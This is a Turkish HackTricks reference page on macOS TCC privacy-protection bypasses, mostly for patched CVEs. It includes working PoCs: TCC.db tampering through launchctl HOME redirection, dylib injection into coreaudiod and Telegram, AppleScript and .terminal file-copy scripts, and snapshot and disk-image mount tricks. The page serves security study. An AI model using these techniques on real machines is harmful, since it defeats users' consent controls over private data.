# macOS TCC Geçişleri

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan ileri seviyeye öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek veya HackTricks'i PDF olarak indirmek** isterseniz, [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## İşlevlere Göre

### Yazma Geçişi

Bu bir geçiş değil, sadece TCC'nin nasıl çalıştığıdır: **Yazmaya karşı koruma sağlamaz**. Terminal, bir kullanıcının Masaüstünü okuma erişimine sahip olmasa bile, **hala yazabilir**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Yeni **dosyaya** erişim sağlamak için **yaratıcı uygulamaya** okuma izni vermek için **`com.apple.macl`** genişletilmiş özniteliği eklenir.

### SSH Atlatma

Varsayılan olarak, **SSH üzerinden erişim "Tam Disk Erişimi"ne sahipti**. Bunun devre dışı bırakılması için listelenmiş ancak devre dışı bırakılmış olması gerekmektedir (listeden kaldırmak bu yetkileri kaldırmaz):

![](<../../../../../.gitbook/assets/image (569).png>)

Burada, bazı **kötü amaçlı yazılımların bu korumayı nasıl atlatabildiğine** dair örnekler bulabilirsiniz:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Not olarak, artık SSH'yi etkinleştirebilmek için **Tam Disk Erişimi'ne** ihtiyacınız vardır.
{% endhint %}

### Uzantıları İşleme - CVE-2022-26767

Dosyalara **`com.apple.macl`** özniteliği verilir ve bu öznitelik, bir dosyayı bir uygulamanın üzerine sürükleyip bıraktığınızda veya bir kullanıcı bir dosyayı **çift tıkladığında** varsayılan uygulama ile açtığında ayarlanır.

Bu nedenle, bir kullanıcı **kötü amaçlı bir uygulama** kaydedebilir ve tüm uzantıları işlemek için Launch Services'ı çağırabilir, böylece kötü amaçlı dosya okuma izni alır.

### iCloud

**`com.apple.private.icloud-account-access`** yetkisiyle **`com.apple.iCloudHelper`** XPC hizmetiyle iletişim kurmak mümkündür ve bu hizmet **iCloud belirteçleri sağlar**.

**iMovie** ve **Garageband** bu yetkiye sahipti ve diğer yetkilere de izin verildi.

Bu yetkiden iCloud belirteçlerini almak için yapılan saldırı hakkında daha fazla **bilgi** için aşağıdaki sunumu inceleyin: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Otomasyon

**`kTCCServiceAppleEvents`** izni olan bir uygulama, diğer uygulamaları **kontrol edebilir**. Bu, diğer uygulamalara verilen izinleri **kötüye kullanabilme** anlamına gelir.

Apple Script'ler hakkında daha fazla bilgi için kontrol edin:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Örneğin, bir uygulamanın **`iTerm` üzerinde Otomasyon izni** varsa, örneğin bu örnekte **`Terminal`** iTerm üzerinde erişime sahiptir:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### iTerm Üzerinde

FDA'ya sahip olmayan Terminal, ona sahip olan iTerm'i çağırabilir ve onu kullanarak işlemler gerçekleştirebilir:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Finder Üzerinden

Veya bir Uygulama Finder üzerinden erişime sahipse, aşağıdaki gibi bir betik kullanabilir:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Uygulama Davranışına Göre

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Kullanıcı alanı **tccd daemonu**, TCC kullanıcı veritabanına erişmek için **`HOME`** **env** değişkenini kullanır: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[Stack Exchange gönderisine](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) göre ve TCC daemonu mevcut kullanıcının etki alanında `launchd` aracılığıyla çalıştığı için, ona iletilen **tüm çevre değişkenlerini kontrol etmek mümkündür**.\
Bu nedenle, bir **saldırgan**, **`launchctl`** üzerinde **`$HOME` çevre** değişkenini kontrol edilebilen bir **dizine** işaret etmek için ayarlayabilir, **TCC** daemonunu **yeniden başlatabilir** ve ardından TCC veritabanını **doğrudan değiştirerek** kendisine hiçbir zaman son kullanıcıya sormadan mevcut olan **her TCC yetkisini verebilir**.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notlar

Notlar, TCC korumalı konumlara erişime sahipti, ancak bir not oluşturulduğunda bu, **korumalı olmayan bir konumda oluşturulur**. Bu nedenle, notlara bir korumalı dosyayı bir nota (yani korumalı olmayan bir konuma) kopyalaması istenebilir ve ardından dosyaya erişilebilir:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Taşıma

`/usr/libexec/lsd` ikili dosyası, `libsecurity_translocate` kütüphanesiyle birlikte **`com.apple.private.nullfs_allow`** yetkisine sahipti, bu da ona **nullfs** bağlantısı oluşturma yetkisi veriyordu ve **`com.apple.private.tcc.allow`** yetkisine sahipti ve **`kTCCServiceSystemPolicyAllFiles`** ile her dosyaya erişebiliyordu.

"Library" klasörüne karantina özniteliği eklemek, **`com.apple.security.translocation`** XPC hizmetini çağırmak mümkündü ve ardından Library, **`$TMPDIR/AppTranslocation/d/d/Library`** olarak eşlenir ve Library içindeki tüm belgelere **erişilebilir**.

### CVE-2023-38571 - Müzik ve TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** ilginç bir özelliğe sahiptir: Çalıştığında, kullanıcının "ortam kütüphanesine" **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** bırakılan dosyaları içe aktarır. Dahası, şuna benzer bir şey çağırır: **`rename(a, b);`** burada `a` ve `b` şunlardır:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Bu **`rename(a, b);`** davranışı, bir **Yarış Koşulu**'na karşı savunmasızdır, çünkü `Automatically Add to Music.localized` klasörüne sahte bir **TCC.db** dosyası yerleştirilebilir ve ardından yeni klasör (b) oluşturulduğunda dosya kopyalanır, silinir ve **`~/Library/Application Support/com.apple.TCC`**/ konumuna yönlendirilir.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

**`SQLITE_SQLLOG_DIR="path/folder"`** ise, **herhangi bir açık db'nin o yola kopyalandığı** anlamına gelir. Bu CVE'de bu kontrol, FDA'ya sahip bir işlem tarafından açılacak olan bir SQLite veritabanına **yazmak** için kötüye kullanıldı ve ardından **`SQLITE_SQLLOG_DIR`** ile bir **sembolik bağlantı** oluşturuldu, böylece bu veritabanı **açıldığında**, kullanıcı **TCC.db üzerine yazılır**.

**Daha fazla bilgi** [**yazıda**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **ve** [**sunumda**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### SQLITE\_AUTO\_TRACE

Eğer **`SQLITE_AUTO_TRACE`** çevresel değişkeni ayarlanmışsa, **`libsqlite3.dylib`** kütüphanesi tüm SQL sorgularını **günlüğe kaydetmeye** başlar. Birçok uygulama bu kütüphaneyi kullanır, bu nedenle tüm SQLite sorgularını kaydetmek mümkündü.

Birçok Apple uygulaması, TCC korumalı bilgilere erişmek için bu kütüphaneyi kullanıyordu.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

Bu **env değişkeni, `Metal` çerçevesi tarafından kullanılan** ve çeşitli programların bağımlılığı olan bir değişkendir, en önemlisi FDA'ya sahip olan `Music` programıdır.

Aşağıdaki ayar yapılırsa: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Eğer `path` geçerli bir dizin ise, hata tetiklenecek ve programda neler olduğunu görmek için `fs_usage` kullanabiliriz:

* `path/.dat.nosyncXXXX.XXXXXX` (X rastgele) adında bir dosya `open()` edilecek
* Bir veya daha fazla `write()` işlemi içerikleri dosyaya yazacak (bunu kontrol etmiyoruz)
* `path/.dat.nosyncXXXX.XXXXXX` `rename()` ile `path/name` olarak yeniden adlandırılacak

Bu geçici bir dosya yazma işlemidir ve ardından **güvenli olmayan bir şekilde** **`rename(old, new)`** işlemi gerçekleştirilir.

Bu güvenli değildir çünkü **eski ve yeni yolları ayrı ayrı çözmesi** gerekmektedir, bu da zaman alabilir ve Yarış Koşulu'na karşı savunmasız olabilir. Daha fazla bilgi için `xnu` işlevi `renameat_internal()`'ı kontrol edebilirsiniz.

{% hint style="danger" %}
Yani, temel olarak, ayrıcalıklı bir işlem, kontrol ettiğiniz bir klasörden yeniden adlandırma yaparsa, bir RCE kazanabilir ve farklı bir dosyaya erişmesini sağlayabilir veya bu CVE'de olduğu gibi ayrıcalıklı uygulama tarafından oluşturulan dosyayı açabilir ve bir FD saklayabilir.

Yeniden adlandırma, değiştirmek istediğiniz hedef dosyayı (veya klasörü) bir sembolik bağa işaret edecek şekilde kontrol ettiğiniz bir klasöre erişirse, kaynak dosyayı değiştirmiş veya FD'si varsa, istediğiniz zaman yazabilirsiniz.
{% endhint %}

Bu, CVE'deki saldırıydı: Örneğin, kullanıcının `TCC.db` dosyasını üzerine yazmak için şunları yapabiliriz:

* `/Users/hacker/ourlink`'i `/Users/hacker/Library/Application Support/com.apple.TCC/`'ye işaret edecek şekilde oluşturun
* `/Users/hacker/tmp/` dizinini oluşturun
* `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db` olarak ayarlayın
* bu env değişkeniyle `Music`'i çalıştırarak hatayı tetikleyin
* `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X rastgele) dosyasının `open()`'ını yakalayın
* burada bu dosyayı yazmak için de `open()` yaparız ve dosya tanımlayıcısını elde tutarız
* `/Users/hacker/tmp`'yi `/Users/hacker/ourlink` ile **bir döngü içinde atomik olarak değiştirin**
* bunu yapmamızın nedeni, yarış penceresinin oldukça dar olması nedeniyle başarılı olma şansımızı maksimize etmek, ancak yarışı kaybetmenin ihmal edilebilir bir dezavantajı vardır
* biraz bekleyin
* şanslı olup olmadığımızı test edin
* değilse, tekrar baştan çalıştırın

Daha fazla bilgi için [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Şimdi, `MTL_DUMP_PIPELINES_TO_JSON_FILE` env değişkenini kullanmaya çalışırsanız uygulamalar başlatılmaz
{% endhint %}

### Apple Remote Desktop

Root olarak bu hizmeti etkinleştirebilirsiniz ve **ARD ajanı tam disk erişimine sahip olacak**, bu da bir kullanıcının yeni bir **TCC kullanıcı veritabanını** kopyalaması için kötüye kullanılabileceği anlamına gelir.

## **NFSHomeDirectory** ile

TCC, kullanıcının ev dizinindeki bir veritabanını kullanır ve kullanıcıya özgü kaynaklara erişimi kontrol eder, bu veritabanı **$HOME/Library/Application Support/com.apple.TCC/TCC.db** dizininde bulunur.\
Bu nedenle, kullanıcı **$HOME** env değişkenini başka bir dizine işaret edecek şekilde TCC'yi yeniden başlatmayı başarırsa, kullanıcı **/Library/Application Support/com.apple.TCC/TCC.db** dizininde yeni bir TCC veritabanı oluşturabilir ve TCC'yi herhangi bir uygulamaya herhangi bir TCC izni vermek için kandırabilir.

{% hint style="success" %}
Apple, **`NFSHomeDirectory`** özniteliğinde kullanıcının profilinde depolanan ayarı kullanır ve **`$HOME`** değeri olarak kullanır, bu nedenle bu değeri değiştirmek için izinlere sahip bir uygulamayı (kTCCServiceSystemPolicySysAdminFiles) etkilerseniz, bu seçeneği bir TCC atlatmasıyla **silahlandırabilirsiniz**.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**İlk POC**, [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ve [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kullanarak kullanıcının **HOME** dizinini değiştirmektedir.

1. Hedef uygulama için bir _csreq_ blob alın.
2. Gerekli erişim ve _csreq_ blob ile sahte bir _TCC.db_ dosyası yerleştirin.
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ile kullanıcının Directory Services girişini dışa aktarın.
4. Kullanıcının ev dizinini değiştirmek için Directory Services girişini değiştirin.
5. [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) ile değiştirilmiş Directory Services girişini içe aktarın.
6. Kullanıcının _tccd_ işlemini durdurun ve işlemi yeniden başlatın.

İkinci POC, **`/usr/libexec/configd`**'yi kullanıyordu ve `com.apple.private.tcc.allow` değeri `kTCCServiceSystemPolicySysAdminFiles` olan **`configd`**'yi **`-t`** seçeneğiyle çalıştırmak mümkündü. Bu nedenle, saldırgan, kullanıcının ev dizinini değiştirmek için **`dsexport`** ve **`dsimport`** yöntemini **`configd` kod enjeksiyonu** ile değiştirir.

Daha fazla bilgi için [**orijinal raporu**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) kontrol edin.

## İşlem enjeksiyonu ile

Bir işlemin içine kod enjekte etmek ve TCC ayrıcalıklarını kötüye kullanmak için farklı teknikler vardır:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Ayrıca, TCC'yi atlatmak için en yaygın bulunan işlem enjeksiyonu, **eklentileri (kitaplık yükleme)** aracılığıyla gerçekleştirilir.\
Eklentiler, genellikle kitaplık veya plist formunda ekstra kodlardır ve ana uygulama tarafından **yüklenir** ve ana uygulama bağlamında çalışır. Bu nedenle, ana uygulama TCC kısıtlı dosyalara erişime sahipse (izinler veya yetkilendirmeler yoluyla), **özel kod da buna sahip olacaktır**.

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` uygulamasının **`kTCCServiceSystemPolicySysAdminFiles`** yetkilendirmesi vardı, **`.daplug`** uzantılı eklentiler yüklüydü ve **sertleştirilmiş** çalışma zamanına sahip değildi
### CVE-2020-29621 - Coreaudiod

**`/usr/sbin/coreaudiod`** ikili dosyası, `com.apple.security.cs.disable-library-validation` ve `com.apple.private.tcc.manager` yetkilendirmelerine sahipti. İlki **kod enjeksiyonuna izin verirken**, ikincisi ona **TCC yönetme erişimi** sağlıyordu.

Bu ikili dosya, `/Library/Audio/Plug-Ins/HAL` klasöründen **üçüncü taraf eklentileri** yüklemeye izin veriyordu. Bu nedenle, bu PoC ile bir eklenti yüklemek ve TCC izinlerini **kötüye kullanmak mümkündü**:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) bakın.

### Aygıt Soyutlama Katmanı (DAL) Eklentileri

Core Media I/O üzerinden kamera akışını açan sistem uygulamaları (**`kTCCServiceCamera`** ile işaretlenen uygulamalar), `/Library/CoreMediaIO/Plug-Ins/DAL` dizininde bulunan bu eklentileri işlem içine yükler (SIP kısıtlamasına tabi değildir).

Oraya yalnızca bir kütüphaneyi **yapıcı** ile depolamak, kodu **enjekte etmek** için işe yarayacaktır.

Birkaç Apple uygulaması bu açığa karşı savunmasızdı.

### Firefox

Firefox uygulamasında `com.apple.security.cs.disable-library-validation` ve `com.apple.security.cs.allow-dyld-environment-variables` yetkilendirmeleri bulunuyordu:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Daha fazla bilgi için [**orijinal raporu kontrol edin**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

`/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` ikili dosyası, **`com.apple.private.tcc.allow`** ve **`com.apple.security.get-task-allow`** yetkilendirmelerine sahipti, bu da işlem içine kod enjekte etmeyi ve TCC yetkilerini kullanmayı mümkün kıldı.

### CVE-2023-26818 - Telegram

Telegram, **`com.apple.security.cs.allow-dyld-environment-variables`** ve **`com.apple.security.cs.disable-library-validation`** yetkilendirmelerine sahipti, bu nedenle kamerayla kayıt gibi izinlere erişmek gibi kötüye kullanılabiliyordu. [**Payload'ı yazıda bulabilirsiniz**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Özel bir plist enjekte etmek için bir kütüphane yüklemek için env değişkenini kullanmanın nasıl yapıldığına dikkat edin ve bunu başlatmak için **`launchctl`** kullanıldı:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Açık çağrılarla

Kumanda kabı içindeyken bile **`open`** çağrısı yapmak mümkündür.

### Terminal Komut Dosyaları

Teknik kişiler tarafından kullanılan bilgisayarlarda, terminalin **Tam Disk Erişimi (TDE)** verilmesi oldukça yaygındır. Ve bununla birlikte **`.terminal`** komut dosyalarını çağırmak mümkündür.

**`.terminal`** komut dosyaları, **`CommandString`** anahtarında yürütülecek komutu içeren bu gibi plist dosyalarıdır:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Bir uygulama, /tmp gibi bir konumda bir terminal komut dosyası yazabilir ve şu şekilde bir komutla başlatabilir:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Montaj Yoluyla

### CVE-2020-9771 - mount\_apfs TCC atlatma ve ayrıcalık yükseltme

**Herhangi bir kullanıcı** (yetkisiz olanlar bile) bir zaman makinesi anlık görüntüsü oluşturabilir ve monte edebilir ve bu anlık görüntünün **tüm dosyalarına erişebilir**.\
**Yalnızca ayrıcalıklı** olan, kullanılan uygulamanın (`Terminal` gibi) **Tam Disk Erişimi** (FDA) erişimine (`kTCCServiceSystemPolicyAllfiles`) sahip olmasıdır ve bunun için bir yönetici tarafından verilmesi gerekmektedir.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Daha detaylı bir açıklama [**orijinal raporda bulunabilir**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - TCC dosyası üzerine monte etme

TCC DB dosyası korunsa bile, yeni bir TCC.db dosyasını **dizin üzerine monte etmek mümkündü**:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
**Tam saldırıyı** [**orijinal yazıda**](https://theevilbit.github.io/posts/cve-2021-30808/) kontrol edin.

### asr

**`/usr/sbin/asr`** aracı, TCC korumalarını atlayarak tüm diski kopyalamaya ve başka bir yere bağlamaya izin veriyordu.

### Konum Hizmetleri

**`/var/db/locationd/clients.plist`** dizininde üçüncü bir TCC veritabanı bulunur ve bu veritabanı, **konum hizmetlerine erişime izin verilen istemcileri** belirtir.\
**`/var/db/locationd/` klasörü DMG bağlama işleminden korunmadığından** kendi plist'imizi bağlamak mümkündü.

## Başlangıç uygulamalarıyla

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Grep ile

Birçok durumda, dosyalar hassas bilgileri (e-postalar, telefon numaraları, mesajlar vb.) korunmayan konumlarda depolar (bu, Apple için bir zafiyet olarak kabul edilir).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Sentetik Tıklamalar

Bu artık çalışmıyor, ancak [**geçmişte çalışıyordu**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Başka bir yol [**CoreGraphics olayları kullanarak**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Referans

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **tanıtmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github reposuna **PR göndererek paylaşın**.

</details>
